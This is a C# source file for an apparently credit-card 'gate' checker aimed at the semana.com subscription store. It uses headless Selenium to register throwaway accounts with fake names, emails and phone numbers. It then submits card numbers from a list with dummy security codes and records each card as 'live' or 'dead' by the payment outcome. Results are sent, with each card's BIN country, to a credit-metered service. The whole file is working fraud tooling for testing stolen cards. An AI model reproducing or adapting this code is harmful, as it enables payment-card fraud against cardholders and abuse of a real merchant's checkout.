using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Semana
    {
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        check check = new check();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run==true)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.semana.com/store/?utm_campaign=SuscripcionPortales&utm_medium=referral&utm_source=semana.com&utm_content=botonheader_ARC&utm_term=";
                Thread.Sleep(6000);
                correo = "joseffernana" + getNum() + "@hotmail.com";
                Form1.circularProgressBar1.Value = 10;
                if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[1]/div[3]/div/div[1]/div[1]/div[3]/div/a")))
                {
                    Form1.circularProgressBar1.Value = 50;
                    driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[1]/div[3]/div/div[1]/div[1]/div[3]/div/a")).Click();
                    Thread.Sleep(2000);

                    if (tiempoElemento(By.XPath("//*[@id='contenedorModal']/input[1]")))
                    {
                        driver.FindElement(By.XPath("//*[@id='contenedorModal']/input[1]")).SendKeys("JOSE REYES");
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='contenedorModal']/input[2]")).SendKeys(correo);
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='contenedorModal']/div[1]/input")).SendKeys(clave);
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='contenedorModal']/button")).Click();
                        Thread.Sleep(2000);
                        if (tiempoElemento(By.XPath("//*[@id='contenedorModal']/button[1]")))
                        {
                            driver.FindElement(By.XPath("//*[@id='contenedorModal']/button[1]")).Click();
                            Thread.Sleep(2000);
                            //driver.SwitchTo().Window(driver.WindowHandles[1]);
                            //Thread.Sleep(1000);
                           // if (tiempoElemento(By.XPath("//*[@id='paySelection']"))){

                               // driver.FindElement(By.Id("paySelection")).Click();
                                Thread.Sleep(2000);

                                if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[2]/div/input")))
                                {
                                    driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[2]/div/input")).SendKeys("0998745263");
                                    Thread.Sleep(200);
                                    driver.FindElement(By.XPath("//*[@id='gtmInformacionStore']")).Click();
                                    Thread.Sleep(2000);
                                    if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[1]/div/input")))
                                    {
                                        pago();
                                    }
                                }

                            //}
                            //else
                            //{
                            //    restart();
                            //}
                            if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[1]/div/input")))
                            {
                                pago();
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }

                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    restart();
                }
            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run==true)
                {
                    if (pagos < 3)
                    {

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[1]/div/input")).SendKeys("JOSE REYES");
                        Thread.Sleep(200);
                        driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[2]/div[1]/div/input")).SendKeys(ccnum);
                        Thread.Sleep(200);
                        if (ccLine[3].Trim().Length == 3)
                        {
                            driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[2]/div[2]/div/input")).SendKeys("000");
                        }
                        if (ccLine[3].Trim().Length == 4)
                        {
                            driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[2]/div[2]/div/input")).SendKeys("0000");
                        }
                    
                        Thread.Sleep(200);
                        var mes = new SelectElement(driver.FindElement(By.Name("mesVencimiento")));
                        mes.SelectByValue(ccLine[1]);
                        Thread.Sleep(300);
                        var anio = new SelectElement(driver.FindElement(By.Name("anoVencimiento")));
                        anio.SelectByValue(ccLine[2]);
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='documento']")).SendKeys("2154891"+RandomNumber(222, 999).ToString());
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='payDataPay']")).Click();
                        Thread.Sleep(3000);
                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live - " + cc + " $" + RandomNumber(1, 5) + ".00 - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    restart();
                }
                //MessageBox.Show(ex.ToString());
               
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                    if (IsElementPresent(By.XPath("/html/body/div[1]/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[7]/div/div/div/label")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[7]/div/div/div/label")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[7]/div/div/div/label")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }


                    if (IsElementPresent(By.XPath("//*[@id='exitosoStore']/div[2]/h2")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='exitosoStore']/div[2]/h2")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='exitosoStore']/div[2]/h2")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='gtmExitosoStore']/div[2]/h2")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='gtmExitosoStore']/div[2]/h2")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='gtmExitosoStore']/div[2]/h2")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }



                }
                tiempo++;
            }

            if (estado == "dead")
            {
                driver.Navigate().Refresh();
                Thread.Sleep(200);
                if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[2]/div/input")))
                {
                    driver.FindElement(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[2]/div/input")).SendKeys("099874"+RandomNumber(1254,9999).ToString());
                    Thread.Sleep(200);
                    driver.FindElement(By.XPath("//*[@id='gtmInformacionStore']")).Click();
                    Thread.Sleep(2000);
                    if (tiempoElemento(By.XPath("//*[@id='fusion-app']/div/main/div/div[2]/div[3]/div[1]/div[1]/div/div/div[1]/div[1]/div/input")))
                    {
                        return false;
                    }
                }
                else
                {
                    restart();
                }
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

